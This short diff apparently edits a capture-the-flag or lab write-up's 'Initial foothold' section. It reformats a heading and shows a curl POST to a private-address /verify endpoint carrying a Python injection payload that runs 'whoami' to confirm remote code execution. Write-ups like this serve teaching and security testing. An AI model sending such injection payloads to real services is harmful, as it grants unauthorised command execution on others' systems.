@@ -70,7 +70,10 @@ Date: Fri, 30 Jan 2026 10:07:12 GMT
 
 25
 ```                                  
-#Initial foothold
+# Initial foothold  
+
+Use python code to execute command whoami to confirm we have RCE
+
 ```
 Use python code to execute command whoami to confirm we have RCE
 $ curl -i http://192.168.129.117:50000/verify -X POST -d "code=__import__('os').popen('whoami').read()"
